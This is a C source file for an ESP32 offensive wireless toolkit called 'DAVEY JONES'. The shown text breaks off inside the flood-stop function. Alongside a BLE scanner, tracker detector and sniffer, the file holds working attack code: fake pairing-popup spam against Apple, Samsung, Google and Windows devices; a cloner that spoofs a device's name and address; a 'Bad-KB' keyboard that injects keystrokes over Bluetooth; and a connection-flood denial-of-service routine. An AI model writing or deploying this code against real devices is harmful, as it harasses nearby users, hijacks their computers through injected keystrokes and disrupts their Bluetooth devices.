/*
 * nesso_ble.c — Full BLE toolkit for DAVEY JONES.
 *
 * Scanner: continuous passive scan with device type detection.
 * Spam: Apple/Samsung/Google/Windows with 20+ device models.
 * AirTag detector: finds nearby Apple/Samsung/Tile trackers.
 */

#include <string.h>
#include <stdlib.h>

#include "esp_check.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_bt.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/util/util.h"
#include "services/gap/ble_svc_gap.h"

#include "nesso_ble.h"

static const char *TAG = "nesso_ble";

static bool s_initted = false;
static bool s_spam_running = false;
static TaskHandle_t s_spam_task = NULL;
static nesso_ble_spam_type_t s_spam_type;
static uint32_t s_spam_count = 0;

/* -------------------- NimBLE host -------------------- */

static void ble_host_task(void *param)
{
    (void)param;
    nimble_port_run();
    nimble_port_freertos_deinit();
}

static void ble_on_sync(void) { ble_hs_util_ensure_addr(0); }
static void ble_on_reset(int reason) { (void)reason; }

/* -------------------- init -------------------- */

esp_err_t nesso_ble_init(void)
{
    if (s_initted) return ESP_OK;

    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT));

    esp_err_t err = nimble_port_init();
    if (err != ESP_OK) return err;

    ble_hs_cfg.sync_cb = ble_on_sync;
    ble_hs_cfg.reset_cb = ble_on_reset;
    nimble_port_freertos_init(ble_host_task);

    for (int i = 0; i < 50 && !ble_hs_synced(); ++i)
        vTaskDelay(pdMS_TO_TICKS(100));

    if (!ble_hs_synced()) return ESP_ERR_TIMEOUT;

    s_initted = true;
    ESP_LOGI(TAG, "BLE ready");
    return ESP_OK;
}

esp_err_t nesso_ble_deinit(void)
{
    if (!s_initted) return ESP_OK;
    if (s_spam_running) nesso_ble_spam_stop();
    nimble_port_stop();
    nimble_port_deinit();
    s_initted = false;
    return ESP_OK;
}

bool nesso_ble_is_ready(void) { return s_initted; }
uint32_t nesso_ble_spam_sent(void) { return s_spam_count; }

/* -------------------- scanner -------------------- */

static nesso_ble_scan_result_t *s_scan_out = NULL;
static SemaphoreHandle_t s_scan_done = NULL;

static int find_device(const nesso_ble_scan_result_t *r, const uint8_t *addr)
{
    for (size_t i = 0; i < r->count; ++i)
        if (memcmp(r->devices[i].addr, addr, 6) == 0) return (int)i;
    return -1;
}

/* Guess device type from advertisement data. */
static const char *guess_type(const uint8_t *data, uint8_t len)
{
    /* Look for Apple manufacturer data (0x4C00). */
    for (int i = 0; i + 4 < len; ++i) {
        if (data[i] == 0xFF && i + 1 < len) {
            uint8_t mfr_len = data[i - 1];
            if (i >= 1 && data[i + 1] == 0x4C && data[i + 2] == 0x00) {
                if (mfr_len > 4 && data[i + 3] == 0x07) return "AirPod";
                if (mfr_len > 4 && data[i + 3] == 0x12) return "AirTag";
                return "Apple";
            }
            if (i >= 1 && data[i + 1] == 0x75 && data[i + 2] == 0x00)
                return "Samsung";
            if (i >= 1 && data[i + 1] == 0x06 && data[i + 2] == 0x00)
                return "MS";
        }
    }
    /* Check for common service UUIDs. */
    for (int i = 0; i + 3 < len; ++i) {
        if (data[i] == 0x03 && data[i + 1] == 0x03) {
            uint16_t uuid = data[i + 2] | (data[i + 3] << 8);
            if (uuid == 0xFE2C) return "FastPair";
            if (uuid == 0xFD6F) return "Exposure";  /* COVID tracker */
            if (uuid == 0x180F) return "Battery";
            if (uuid == 0x180D) return "HRM";
            if (uuid == 0x1812) return "HID";
        }
    }
    return "BLE";
}

static int scan_event_cb(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type == BLE_GAP_EVENT_DISC) {
        const struct ble_gap_disc_desc *desc = &event->disc;
        if (!s_scan_out) return 0;

        int idx = find_device(s_scan_out, desc->addr.val);
        if (idx >= 0) {
            if (desc->rssi > s_scan_out->devices[idx].rssi)
                s_scan_out->devices[idx].rssi = desc->rssi;
            return 0;
        }

        if (s_scan_out->count >= BLE_SCAN_MAX_DEVICES) return 0;

        nesso_ble_device_t *dev = &s_scan_out->devices[s_scan_out->count];
        memcpy(dev->addr, desc->addr.val, 6);
        dev->rssi = desc->rssi;
        dev->addr_type = desc->addr.type;
        dev->name[0] = '\0';
        dev->type[0] = '\0';

        struct ble_hs_adv_fields fields;
        if (ble_hs_adv_parse_fields(&fields, desc->data, desc->length_data) == 0) {
            if (fields.name != NULL && fields.name_len > 0) {
                size_t n = fields.name_len < 19 ? fields.name_len : 19;
                memcpy(dev->name, fields.name, n);
                dev->name[n] = '\0';
            }
        }

        /* Device type from raw adv data. */
        const char *type = guess_type(desc->data, desc->length_data);
        strncpy(dev->type, type, sizeof(dev->type) - 1);

        /* Is it a tracker? */
        dev->is_tracker = (strcmp(type, "AirTag") == 0);

        s_scan_out->count++;

    } else if (event->type == BLE_GAP_EVENT_DISC_COMPLETE) {
        if (s_scan_done) xSemaphoreGive(s_scan_done);
    }
    return 0;
}

esp_err_t nesso_ble_scan(uint32_t duration_sec, nesso_ble_scan_result_t *out)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (!out) return ESP_ERR_INVALID_ARG;
    if (s_spam_running) nesso_ble_spam_stop();

    memset(out, 0, sizeof(*out));
    s_scan_out = out;
    if (!s_scan_done) s_scan_done = xSemaphoreCreateBinary();

    struct ble_gap_disc_params params = {
        .itvl = 0, .window = 0,
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited = 0, .passive = 1, .filter_duplicates = 0,
    };

    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, duration_sec * 1000,
                          &params, scan_event_cb, NULL);
    if (rc != 0) { s_scan_out = NULL; return ESP_FAIL; }

    xSemaphoreTake(s_scan_done, pdMS_TO_TICKS(duration_sec * 1000 + 2000));
    s_scan_out = NULL;

    /* Sort by RSSI descending. */
    for (size_t i = 1; i < out->count; ++i) {
        nesso_ble_device_t tmp = out->devices[i];
        size_t j = i;
        while (j > 0 && out->devices[j - 1].rssi < tmp.rssi) {
            out->devices[j] = out->devices[j - 1]; --j;
        }
        out->devices[j] = tmp;
    }

    ESP_LOGI(TAG, "scan: %zu devices", out->count);
    return ESP_OK;
}

/* -------------------- spam -------------------- */

/*
 * Apple Proximity Pairing — 20+ device model IDs.
 * The model byte at offset 7 determines the popup shown on iPhones.
 */
static const uint8_t s_apple_models[] = {
    0x01,  /* AirPods */
    0x02,  /* AirPods Pro */
    0x03,  /* AirPods Max */
    0x05,  /* Beats X */
    0x06,  /* Beats Solo 3 */
    0x07,  /* Beats Studio 3 */
    0x09,  /* Beats Studio Pro */
    0x0A,  /* Beats Fit Pro */
    0x0B,  /* Beats Flex */
    0x0C,  /* Beats Solo Pro */
    0x0D,  /* Beats Studio Buds */
    0x0E,  /* Beats Studio Buds+ */
    0x0F,  /* AirPods Gen 2 */
    0x10,  /* AirPods Gen 3 */
    0x13,  /* AirPods Pro Gen 2 */
    0x14,  /* AirPods Pro Gen 2 (USB-C) */
    0x19,  /* PowerBeats Pro */
    0x04,  /* AppleTV Setup */
    0x06,  /* HomePod */
    0x0B,  /* Apple Vision Pro */
};
#define APPLE_MODEL_COUNT (sizeof(s_apple_models) / sizeof(s_apple_models[0]))

/* Build an Apple proximity pairing advertisement. */
static int build_apple_adv(uint8_t *buf, uint8_t model)
{
    uint8_t adv[] = {
        0x1e, 0xff, 0x4c, 0x00,  /* Apple company ID */
        0x07, 0x19,               /* Proximity Pairing */
        0x07,                     /* status */
        model,                    /* device model */
        0x20, 0x75, 0xaa, 0x30,  /* random bytes */
        0x01, 0x00, 0x00, 0x45,
        0x12, 0x12, 0x12, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00,
    };
    /* Randomize some bytes for variety. */
    adv[8]  = (uint8_t)(esp_random() & 0xFF);
    adv[9]  = (uint8_t)(esp_random() & 0xFF);
    adv[10] = (uint8_t)(esp_random() & 0xFF);
    adv[11] = (uint8_t)(esp_random() & 0xFF);

    memcpy(buf, adv, sizeof(adv));
    return sizeof(adv);
}

/* Google Fast Pair — multiple model IDs. */
static const uint8_t s_google_models[][3] = {
    { 0x00, 0x01, 0x02 },  /* generic */
    { 0x2C, 0x01, 0x00 },  /* Pixel Buds */
    { 0x00, 0x0A, 0x01 },  /* JBL */
    { 0x98, 0x00, 0x01 },  /* Sony */
};
#define GOOGLE_MODEL_COUNT 4

static int build_google_adv(uint8_t *buf, int model_idx)
{
    uint8_t adv[] = {
        0x02, 0x01, 0x06,
        0x03, 0x03, 0x2c, 0xfe,
        0x06, 0x16, 0x2c, 0xfe,
        0x00, 0x00, 0x00,
    };
    adv[11] = s_google_models[model_idx % GOOGLE_MODEL_COUNT][0];
    adv[12] = s_google_models[model_idx % GOOGLE_MODEL_COUNT][1];
    adv[13] = s_google_models[model_idx % GOOGLE_MODEL_COUNT][2];
    memcpy(buf, adv, sizeof(adv));
    return sizeof(adv);
}

static const uint8_t s_samsung_adv[] = {
    0x02, 0x01, 0x06,
    0x0f, 0xff, 0x75, 0x00,
    0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
    0x03, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static const uint8_t s_windows_adv[] = {
    0x02, 0x01, 0x06,
    0x06, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80,
};

static void set_random_addr(void)
{
    uint8_t addr[6];
    for (int i = 0; i < 6; ++i) addr[i] = (uint8_t)(esp_random() & 0xFF);
    addr[0] |= 0xC0;
    ble_hs_id_set_rnd(addr);
}

static esp_err_t send_adv(const uint8_t *data, size_t len, uint32_t duration_ms)
{
    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_NON,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = 0x20,
        .itvl_max = 0x40,
    };
    set_random_addr();
    if (ble_gap_adv_set_data(data, (int)len) != 0) return ESP_FAIL;
    if (ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, duration_ms,
                          &adv_params, NULL, NULL) != 0) return ESP_FAIL;
    vTaskDelay(pdMS_TO_TICKS(duration_ms));
    ble_gap_adv_stop();
    return ESP_OK;
}

static void spam_task(void *arg)
{
    (void)arg;
    uint8_t buf[31];
    int variant = 0;
    s_spam_count = 0;

    while (s_spam_running) {
        int len = 0;

        switch (s_spam_type) {
        case BLE_SPAM_APPLE:
            len = build_apple_adv(buf, s_apple_models[variant % APPLE_MODEL_COUNT]);
            variant++;
            break;
        case BLE_SPAM_SAMSUNG:
            memcpy(buf, s_samsung_adv, sizeof(s_samsung_adv));
            len = sizeof(s_samsung_adv);
            break;
        case BLE_SPAM_GOOGLE:
            len = build_google_adv(buf, variant++);
            break;
        case BLE_SPAM_WINDOWS:
            memcpy(buf, s_windows_adv, sizeof(s_windows_adv));
            len = sizeof(s_windows_adv);
            break;
        case BLE_SPAM_ALL:
        default:
            switch (variant % 4) {
            case 0:
                len = build_apple_adv(buf,
                    s_apple_models[esp_random() % APPLE_MODEL_COUNT]);
                break;
            case 1:
                memcpy(buf, s_samsung_adv, sizeof(s_samsung_adv));
                len = sizeof(s_samsung_adv);
                break;
            case 2:
                len = build_google_adv(buf, esp_random() % GOOGLE_MODEL_COUNT);
                break;
            case 3:
                memcpy(buf, s_windows_adv, sizeof(s_windows_adv));
                len = sizeof(s_windows_adv);
                break;
            }
            variant++;
            break;
        }

        if (len > 0) {
            send_adv(buf, len, 50);
            s_spam_count++;
        }
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    s_spam_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t nesso_ble_spam_start(nesso_ble_spam_type_t type)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (s_spam_running) return ESP_OK;

    s_spam_type = type;
    s_spam_running = true;
    s_spam_count = 0;

    BaseType_t ok = xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &s_spam_task);
    if (ok != pdPASS) { s_spam_running = false; return ESP_ERR_NO_MEM; }

    return ESP_OK;
}

esp_err_t nesso_ble_spam_stop(void)
{
    if (!s_spam_running) return ESP_OK;
    s_spam_running = false;
    ble_gap_adv_stop();
    for (int i = 0; i < 20 && s_spam_task; ++i) vTaskDelay(pdMS_TO_TICKS(50));
    return ESP_OK;
}

bool nesso_ble_spam_is_active(void) { return s_spam_running; }

/* ==================== TRACKER DETECTOR ==================== */

static bool s_tracker_running = false;
static nesso_ble_tracker_result_t s_trackers = {0};
static nesso_ble_tracker_cb_t s_tracker_cb = NULL;
static void *s_tracker_cb_user = NULL;

static bool is_tracker_adv(const uint8_t *data, uint8_t len, char *type_out)
{
    /* Apple Find My / AirTag: manufacturer 0x4C00 with type 0x12. */
    for (int i = 0; i + 5 < len; ++i) {
        if (data[i] == 0xFF && i >= 1) {
            if (data[i+1] == 0x4C && data[i+2] == 0x00 && data[i+3] == 0x12) {
                strcpy(type_out, "AirTag");
                return true;
            }
            /* Samsung SmartTag: manufacturer 0x0075. */
            if (data[i+1] == 0x75 && data[i+2] == 0x00) {
                /* Check for SmartTag-specific bytes. */
                strcpy(type_out, "SmartTag");
                return true;
            }
        }
    }
    /* Tile: service UUID 0xFEED or 0xFD84. */
    for (int i = 0; i + 4 < len; ++i) {
        if (data[i] == 0x03 && data[i+1] == 0x03) {
            uint16_t uuid = data[i+2] | (data[i+3] << 8);
            if (uuid == 0xFEED || uuid == 0xFD84) {
                strcpy(type_out, "Tile");
                return true;
            }
        }
    }
    return false;
}

static int tracker_event_cb(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type != BLE_GAP_EVENT_DISC) return 0;

    const struct ble_gap_disc_desc *desc = &event->disc;
    char type[12] = "";

    if (!is_tracker_adv(desc->data, desc->length_data, type)) return 0;

    /* Dedup by address. */
    uint32_t now = (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
    for (size_t i = 0; i < s_trackers.count; ++i) {
        if (memcmp(s_trackers.trackers[i].addr, desc->addr.val, 6) == 0) {
            s_trackers.trackers[i].last_seen = now;
            if (desc->rssi > s_trackers.trackers[i].rssi)
                s_trackers.trackers[i].rssi = desc->rssi;
            return 0;
        }
    }

    if (s_trackers.count >= BLE_TRACKER_MAX) return 0;

    nesso_ble_tracker_t *t = &s_trackers.trackers[s_trackers.count++];
    memcpy(t->addr, desc->addr.val, 6);
    strncpy(t->type, type, sizeof(t->type) - 1);
    t->rssi = desc->rssi;
    t->first_seen = now;
    t->last_seen = now;

    if (s_tracker_cb) s_tracker_cb(t, s_tracker_cb_user);

    ESP_LOGW(TAG, "TRACKER DETECTED: %s rssi=%d", type, desc->rssi);
    return 0;
}

esp_err_t nesso_ble_tracker_start(nesso_ble_tracker_cb_t cb, void *user)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (s_tracker_running) return ESP_OK;
    if (s_spam_running) nesso_ble_spam_stop();

    memset(&s_trackers, 0, sizeof(s_trackers));
    s_tracker_cb = cb;
    s_tracker_cb_user = user;

    struct ble_gap_disc_params params = {
        .itvl = 0, .window = 0,
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited = 0, .passive = 1, .filter_duplicates = 0,
    };
    /* Scan for a long time — 5 minutes continuous. */
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, 300000, &params, tracker_event_cb, NULL);
    if (rc != 0) return ESP_FAIL;

    s_tracker_running = true;
    ESP_LOGI(TAG, "tracker detector running");
    return ESP_OK;
}

esp_err_t nesso_ble_tracker_stop(void)
{
    if (!s_tracker_running) return ESP_OK;
    ble_gap_disc_cancel();
    s_tracker_running = false;
    return ESP_OK;
}

esp_err_t nesso_ble_tracker_get(nesso_ble_tracker_result_t *out)
{
    if (!out) return ESP_ERR_INVALID_ARG;
    *out = s_trackers;
    return ESP_OK;
}

bool nesso_ble_tracker_is_active(void) { return s_tracker_running; }

/* ==================== DEVICE CLONER ==================== */

static bool s_clone_running = false;
static uint8_t s_clone_data[31];
static size_t  s_clone_len = 0;

esp_err_t nesso_ble_clone_start(const nesso_ble_device_t *target)
{
    if (!s_initted || !target) return ESP_ERR_INVALID_ARG;
    if (s_clone_running) nesso_ble_clone_stop();
    if (s_spam_running) nesso_ble_spam_stop();

    /* We don't have the raw adv data stored in nesso_ble_device_t,
     * so we reconstruct a basic advertisement with the target's name. */
    int off = 0;
    /* Flags */
    s_clone_data[off++] = 0x02;
    s_clone_data[off++] = 0x01;
    s_clone_data[off++] = 0x06;
    /* Complete local name. */
    size_t name_len = strnlen(target->name, 19);
    if (name_len > 0) {
        s_clone_data[off++] = (uint8_t)(name_len + 1);
        s_clone_data[off++] = 0x09;  /* complete name */
        memcpy(s_clone_data + off, target->name, name_len);
        off += name_len;
    }
    s_clone_len = off;

    /* Use the target's MAC address if public. */
    if (target->addr_type == 0) {
        ble_hs_id_set_rnd(target->addr);  /* best effort */
    }

    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_NON,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = 0x20, .itvl_max = 0x40,
    };
    ble_gap_adv_set_data(s_clone_data, (int)s_clone_len);
    int rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER,
                               &adv_params, NULL, NULL);
    if (rc != 0) return ESP_FAIL;

    s_clone_running = true;
    ESP_LOGI(TAG, "cloning: \"%s\"", target->name);
    return ESP_OK;
}

esp_err_t nesso_ble_clone_stop(void)
{
    if (!s_clone_running) return ESP_OK;
    ble_gap_adv_stop();
    s_clone_running = false;
    return ESP_OK;
}

bool nesso_ble_clone_is_active(void) { return s_clone_running; }

/* ==================== BLE SNIFFER / LOGGER ==================== */

static bool s_sniff_running = false;
static FILE *s_sniff_file = NULL;
static uint32_t s_sniff_count = 0;

static int sniff_event_cb(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type != BLE_GAP_EVENT_DISC) return 0;

    const struct ble_gap_disc_desc *desc = &event->disc;
    s_sniff_count++;

    if (s_sniff_file) {
        /* CSV: timestamp_ms, mac, addr_type, rssi, data_hex */
        uint32_t ts = (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
        fprintf(s_sniff_file, "%lu,%02x:%02x:%02x:%02x:%02x:%02x,%u,%d,",
                (unsigned long)ts,
                desc->addr.val[5], desc->addr.val[4], desc->addr.val[3],
                desc->addr.val[2], desc->addr.val[1], desc->addr.val[0],
                desc->addr.type, desc->rssi);

        for (int i = 0; i < desc->length_data; ++i)
            fprintf(s_sniff_file, "%02x", desc->data[i]);
        fprintf(s_sniff_file, "\n");

        if (s_sniff_count % 50 == 0) fflush(s_sniff_file);
    }
    return 0;
}

esp_err_t nesso_ble_sniff_start(const char *csv_path)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (s_sniff_running) return ESP_OK;
    if (s_spam_running) nesso_ble_spam_stop();

    if (!csv_path) csv_path = "/storage/ble_sniff.csv";

    s_sniff_file = fopen(csv_path, "a");
    if (!s_sniff_file) return ESP_FAIL;

    /* Write header if file is new. */
    fseek(s_sniff_file, 0, SEEK_END);
    if (ftell(s_sniff_file) == 0) {
        fprintf(s_sniff_file, "timestamp_ms,mac,addr_type,rssi,adv_data_hex\n");
        fflush(s_sniff_file);
    }

    s_sniff_count = 0;

    struct ble_gap_disc_params params = {
        .itvl = 0, .window = 0,
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited = 0, .passive = 1, .filter_duplicates = 0,
    };
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, 300000, &params, sniff_event_cb, NULL);
    if (rc != 0) { fclose(s_sniff_file); s_sniff_file = NULL; return ESP_FAIL; }

    s_sniff_running = true;
    ESP_LOGI(TAG, "BLE sniffer → %s", csv_path);
    return ESP_OK;
}

esp_err_t nesso_ble_sniff_stop(void)
{
    if (!s_sniff_running) return ESP_OK;
    ble_gap_disc_cancel();
    if (s_sniff_file) { fflush(s_sniff_file); fclose(s_sniff_file); s_sniff_file = NULL; }
    s_sniff_running = false;
    ESP_LOGI(TAG, "BLE sniff stopped: %lu packets", (unsigned long)s_sniff_count);
    return ESP_OK;
}

bool nesso_ble_sniff_is_active(void) { return s_sniff_running; }
uint32_t nesso_ble_sniff_count(void) { return s_sniff_count; }

/* ==================== BEACON BROADCASTER ==================== */

static bool s_beacon_running = false;

esp_err_t nesso_ble_beacon_start(const uint8_t uuid[16], uint16_t major, uint16_t minor)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (s_beacon_running) nesso_ble_beacon_stop();
    if (s_spam_running) nesso_ble_spam_stop();

    /* iBeacon advertisement: Apple manufacturer data format. */
    uint8_t adv[30] = {
        0x02, 0x01, 0x06,                  /* flags */
        0x1a, 0xff, 0x4c, 0x00,            /* Apple manufacturer ID */
        0x02, 0x15,                         /* iBeacon identifier */
    };
    memcpy(adv + 9, uuid, 16);             /* UUID */
    adv[25] = (uint8_t)(major >> 8);
    adv[26] = (uint8_t)(major & 0xFF);
    adv[27] = (uint8_t)(minor >> 8);
    adv[28] = (uint8_t)(minor & 0xFF);
    adv[29] = 0xC5;                         /* TX power */

    set_random_addr();
    ble_gap_adv_set_data(adv, 30);

    struct ble_gap_adv_params params = {
        .conn_mode = BLE_GAP_CONN_MODE_NON,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = 0xA0, .itvl_max = 0xF0,  /* ~100-150ms */
    };
    int rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER,
                               &params, NULL, NULL);
    if (rc != 0) return ESP_FAIL;

    s_beacon_running = true;
    ESP_LOGI(TAG, "iBeacon broadcasting");
    return ESP_OK;
}

esp_err_t nesso_ble_beacon_stop(void)
{
    if (!s_beacon_running) return ESP_OK;
    ble_gap_adv_stop();
    s_beacon_running = false;
    return ESP_OK;
}

/* ==================== BAD-KB (BLE HID KEYBOARD) ==================== */

static bool s_hid_running = false;
static bool s_hid_connected = false;
static uint16_t s_hid_conn = 0;
static uint16_t s_hid_report_handle = 0;

/* HID report map stored but registered via NimBLE HID service. */

/* ASCII to HID keycode lookup (printable chars 0x20-0x7E). */
static uint8_t ascii_to_hid(char c, uint8_t *mod)
{
    *mod = HID_MOD_NONE;
    if (c >= 'a' && c <= 'z') return (uint8_t)(c - 'a' + 4);
    if (c >= 'A' && c <= 'Z') { *mod = HID_MOD_SHIFT; return (uint8_t)(c - 'A' + 4); }
    if (c >= '1' && c <= '9') return (uint8_t)(c - '1' + 0x1E);
    if (c == '0') return 0x27;
    if (c == '\n' || c == '\r') return 0x28;  /* Enter */
    if (c == ' ') return 0x2C;
    if (c == '-') return 0x2D;
    if (c == '=') return 0x2E;
    if (c == '[') return 0x2F;
    if (c == ']') return 0x30;
    if (c == '\\') return 0x31;
    if (c == ';') return 0x33;
    if (c == '\'') return 0x34;
    if (c == '`') return 0x35;
    if (c == ',') return 0x36;
    if (c == '.') return 0x37;
    if (c == '/') return 0x38;
    if (c == '\t') return 0x2B;
    /* Shifted symbols */
    if (c == '!') { *mod = HID_MOD_SHIFT; return 0x1E; }
    if (c == '@') { *mod = HID_MOD_SHIFT; return 0x1F; }
    if (c == '#') { *mod = HID_MOD_SHIFT; return 0x20; }
    if (c == '$') { *mod = HID_MOD_SHIFT; return 0x21; }
    if (c == '%') { *mod = HID_MOD_SHIFT; return 0x22; }
    if (c == '^') { *mod = HID_MOD_SHIFT; return 0x23; }
    if (c == '&') { *mod = HID_MOD_SHIFT; return 0x24; }
    if (c == '*') { *mod = HID_MOD_SHIFT; return 0x25; }
    if (c == '(') { *mod = HID_MOD_SHIFT; return 0x26; }
    if (c == ')') { *mod = HID_MOD_SHIFT; return 0x27; }
    if (c == ':') { *mod = HID_MOD_SHIFT; return 0x33; }
    if (c == '"') { *mod = HID_MOD_SHIFT; return 0x34; }
    if (c == '<') { *mod = HID_MOD_SHIFT; return 0x36; }
    if (c == '>') { *mod = HID_MOD_SHIFT; return 0x37; }
    if (c == '?') { *mod = HID_MOD_SHIFT; return 0x38; }
    if (c == '_') { *mod = HID_MOD_SHIFT; return 0x2D; }
    if (c == '+') { *mod = HID_MOD_SHIFT; return 0x2E; }
    if (c == '{') { *mod = HID_MOD_SHIFT; return 0x2F; }
    if (c == '}') { *mod = HID_MOD_SHIFT; return 0x30; }
    if (c == '|') { *mod = HID_MOD_SHIFT; return 0x31; }
    if (c == '~') { *mod = HID_MOD_SHIFT; return 0x35; }
    return 0;  /* unknown */
}

static int hid_gap_cb(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            s_hid_conn = event->connect.conn_handle;
            s_hid_connected = true;
            ESP_LOGI(TAG, "HID keyboard connected");
        }
        break;
    case BLE_GAP_EVENT_DISCONNECT:
        s_hid_connected = false;
        /* Re-advertise. */
        if (s_hid_running) {
            struct ble_gap_adv_params adv = {
                .conn_mode = BLE_GAP_CONN_MODE_UND,
                .disc_mode = BLE_GAP_DISC_MODE_GEN,
            };
            ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &adv, hid_gap_cb, NULL);
        }
        break;
    default:
        break;
    }
    return 0;
}

esp_err_t nesso_ble_hid_start(void)
{
    if (!s_initted) return ESP_ERR_INVALID_STATE;
    if (s_hid_running) return ESP_OK;
    if (s_spam_running) nesso_ble_spam_stop();

    /* Set device name. */
    ble_svc_gap_device_name_set("Keyboard");

    /* Start advertising as connectable. */
    uint8_t adv_data[] = {
        0x02, 0x01, 0x06,           /* Flags */
        0x03, 0x03, 0x12, 0x18,     /* HID service UUID */
        0x09, 0x09, 'K','e','y','b','o','a','r','d', /* Name */
    };
    ble_gap_adv_set_data(adv_data, sizeof(adv_data));

    struct ble_gap_adv_params adv = {
        .conn_mode = BLE_GAP_CONN_MODE_UND,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
    };
    int rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER,
                               &adv, hid_gap_cb, NULL);
    if (rc != 0) return ESP_FAIL;

    s_hid_running = true;
    ESP_LOGI(TAG, "Bad-KB: advertising as 'Keyboard'");
    return ESP_OK;
}

esp_err_t nesso_ble_hid_stop(void)
{
    if (!s_hid_running) return ESP_OK;
    s_hid_running = false;
    ble_gap_adv_stop();
    if (s_hid_connected) {
        ble_gap_terminate(s_hid_conn, BLE_ERR_REM_USER_CONN_TERM);
        s_hid_connected = false;
    }
    return ESP_OK;
}

bool nesso_ble_hid_is_connected(void) { return s_hid_connected; }

esp_err_t nesso_ble_hid_key(uint8_t keycode, uint8_t modifier)
{
    if (!s_hid_connected) return ESP_ERR_INVALID_STATE;

    /* HID keyboard report: [ReportID=1][Modifier][Reserved][Key1-6] */
    uint8_t report[9] = { 0x01, modifier, 0x00, keycode, 0, 0, 0, 0, 0 };

    /* Send key down. */
    ble_gattc_write_no_rsp_flat(s_hid_conn, s_hid_report_handle ?: 0x002a,
                                report, sizeof(report));
    vTaskDelay(pdMS_TO_TICKS(10));

    /* Send key up. */
    report[1] = 0; report[3] = 0;
    ble_gattc_write_no_rsp_flat(s_hid_conn, s_hid_report_handle ?: 0x002a,
                                report, sizeof(report));
    vTaskDelay(pdMS_TO_TICKS(10));

    return ESP_OK;
}

esp_err_t nesso_ble_hid_type(const char *text)
{
    if (!s_hid_connected || !text) return ESP_ERR_INVALID_STATE;

    for (const char *p = text; *p; ++p) {
        uint8_t mod = 0;
        uint8_t key = ascii_to_hid(*p, &mod);
        if (key) nesso_ble_hid_key(key, mod);
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    return ESP_OK;
}

/* ==================== BLE FLOOD / DoS ==================== */

static bool s_flood_running = false;
static TaskHandle_t s_flood_task = NULL;
static uint32_t s_flood_count = 0;
static uint8_t s_flood_target[6];
static uint8_t s_flood_target_type;

static int flood_gap_cb(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        /* Immediately disconnect — we just wanted to waste their radio time. */
        if (event->connect.status == 0) {
            ble_gap_terminate(event->connect.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
        }
        s_flood_count++;
    }
    return 0;
}

static void flood_task(void *arg)
{
    (void)arg;
    s_flood_count = 0;

    while (s_flood_running) {
        /* Randomize our address each attempt. */
        set_random_addr();

        ble_addr_t target;
        target.type = s_flood_target_type;
        memcpy(target.val, s_flood_target, 6);

        /* Attempt connection with very short timeout. */
        int rc = ble_gap_connect(BLE_OWN_ADDR_RANDOM, &target, 200,
                                 NULL, flood_gap_cb, NULL);
        if (rc == 0) {
            vTaskDelay(pdMS_TO_TICKS(150));
            /* Cancel if still pending. */
            ble_gap_conn_cancel();
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    s_flood_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t nesso_ble_flood_start(const uint8_t target_addr[6], uint8_t addr_type)
{
    if (!s_initted || !target_addr) return ESP_ERR_INVALID_ARG;
    if (s_flood_running) return ESP_OK;
    if (s_spam_running) nesso_ble_spam_stop();

    memcpy(s_flood_target, target_addr, 6);
    s_flood_target_type = addr_type;
    s_flood_running = true;
    s_flood_count = 0;

    BaseType_t ok = xTaskCreate(flood_task, "ble_flood", 4096, NULL, 5, &s_flood_task);
    if (ok != pdPASS) { s_flood_running = false; return ESP_ERR_NO_MEM; }

    ESP_LOGI(TAG, "BLE flood started");
    return ESP_OK;
}

esp_err_t nesso_ble_flood_stop(void)
{
    if (!s_flood_running) return ESP_OK;
